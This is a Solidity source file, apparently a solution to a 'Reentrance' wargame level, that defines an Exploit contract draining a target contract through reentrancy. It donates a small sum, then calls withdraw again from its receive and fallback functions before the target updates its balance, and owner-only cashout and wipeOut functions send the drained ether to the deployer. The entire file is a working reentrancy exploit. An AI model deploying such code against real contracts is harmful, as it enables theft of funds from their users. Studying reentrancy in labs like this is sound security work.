// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Exploit {
    Reentrance public reentry;
    address payable owner;

    constructor(address payable _reentryAddress) public {
        owner = msg.sender;
        reentry = Reentrance(_reentryAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function sapItDry() external payable {
        reentry.donate{value: 0.001 ether}(address(this));
        reentry.withdraw(900000000000000);
    }

    receive() external payable {
        reentry.withdraw(900000000000000);
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    fallback() external payable {
        reentry.withdraw(900000000000000);
    }

    function cashout() external onlyOwner {
        (bool success, ) = owner.call{value: balance()}("");
        require(success, "Failed to send Ether");
    }

    function wipeOut() external onlyOwner {
        reentry.withdraw(99999953800000);
        //get the remaining eth (I deposited more eth than the contract originally had in previous tests)
    }
}
